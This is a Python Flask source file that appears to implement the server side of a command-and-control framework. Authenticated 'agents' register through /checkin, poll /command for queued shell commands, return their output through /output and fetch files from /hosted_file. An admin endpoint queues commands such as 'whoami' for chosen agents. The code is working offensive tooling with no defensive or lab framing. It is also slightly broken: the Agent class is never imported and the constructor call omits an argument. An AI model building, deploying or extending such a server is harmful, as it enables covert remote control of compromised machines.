from flask import Flask, request, render_template, redirect, send_from_directory, make_response, jsonify
import random
import base64
#from agent import *
import requests
import re
import os
import json
from datetime import datetime

class HTTP_Handler:

    def __init__(self,port:int,host:str,ssl:bool,active:bool,admin_key:str|None=None,secret_key:str|None=None,agents_using_listener:list|None=None)->object:
        self.port = port
        self.host = host
        self.ssl = ssl
        self.listener = None
        self.active = active
        self.secret_key = secret_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN") for _ in range(random.randint(25,30))]).encode())).decode()
        self.admin_key = admin_key or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN!?-_/\\$") for _ in range(random.randint(30,50))]).encode())).decode()
        self.agents_using_listener = agents_using_listener or []
        self.init_listener()

    def _is_authorization_valid(self,request_header:object)->bool:
        if "X-Auth" in request_header.keys():
            token = request_header.get("X-Auth")
            return token == self.secret_key
        else:
            return False
    
    def _is_admin_authorization_valid(self,request_header:object)->bool:
        if "X-Auth" in request_header.keys():
            token = request_header.get("X-Auth")
            return token == self.admin_key
        else:
            return False

    def init_listener(self)->None:
        listener = Flask(__name__)

        @listener.route("/checkin")
        def checkin():
            if self._is_authorization_valid(request.headers):
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    all_id = [agent.id for agent in self.agents_using_listener]
                    if agent_id not in all_id:
                        print("Adding agent")
                        agent = Agent(None,agent_id)
                        self.agents_using_listener.append(agent)
                        return "True"
                else:
                    print("No identifier")
            else:
                print("Auth not valid")
            print("Rejecting Agent")
            return "False"
        
        @listener.route("/command",methods=["GET"])
        def command():
            if self._is_authorization_valid(request.headers):
                agent_connected = False
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    for agent in self.agents_using_listener:
                        if agent.id == agent_id:
                            agent_connected = True
                            agent.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            if len(agent.command_queue)>0:
                                command_to_run = agent.command_queue.pop(0)
                            else:
                                command_to_run = ""
                            return command_to_run
                    if not agent_connected:
                        return "registration_error"
                               
            return ""


        @listener.route("/output",methods=["POST"])
        def output():
            if self._is_authorization_valid(request.headers):
                if "Identifier" in request.headers.keys():
                    agent_id = request.headers.get("Identifier")
                    for agent in self.agents_using_listener:
                        if agent.id == agent_id:
                            data = request.get_data().decode()
                            agent.output_file.append(data)
                            return ""

            return ""

        @listener.route("/hosted_file",methods=["GET"])
        def hosted_file():
            if self._is_authorization_valid(request.headers):
                print(request.args.get("file"))
                if "file" in request.args.keys():
                    filename = request.args.get("file")
                    if re.match(r"[a-z0-9A-Z.]+",filename):
                        return send_from_directory(listener.instance_path.replace("libs/instance","")+"hosted_files/",f"{filename}")
                    else:
                        return ""
            return ""
        
        @listener.route("/execute_command",methods=["POST"])
        def execute():
            if self._is_admin_authorization_valid(request.headers):
                all_agents = {agent.id:agent for agent in self.agents_using_listener}
                data = request.get_data()
                data = json.loads(data) # {"azerty1":["ls","whoami"]}
                for agent_id in data.keys():
                    if agent_id in all_agents.keys():
                        commands = data[agent_id]
                        for command in commands:
                            all_agents[agent_id].exec_command(command)
                return "True"
                        
            return "False"

        @listener.route("/get_agents")
        def display():
            if self._is_admin_authorization_valid(request.headers):
                dict_of_agents = {}
                for agent in self.get_all_agents():
                    dict_of_agents[agent.id]=agent.__dict__
                return str(dict_of_agents)

            return ""



        self.listener = listener

    def start_listener(self)->None:
        #print(self.secret_key)
        #print(self.admin_key)
        self.active = True
        if self.ssl:
            self.listener.run(host=self.host,port=self.port,ssl_context="adhoc")
        else:
            self.listener.run(host=self.host,port=self.port)
    
    def stop_listener(self)->None:
        self.active = False
    
    def get_all_agents(self)->list:
        return self.agents_using_listener
    


if __name__ == '__main__':
    app = HTTP_Handler(8080,"0.0.0.0",1)
    print(app.__dict__)
    app.start_listener()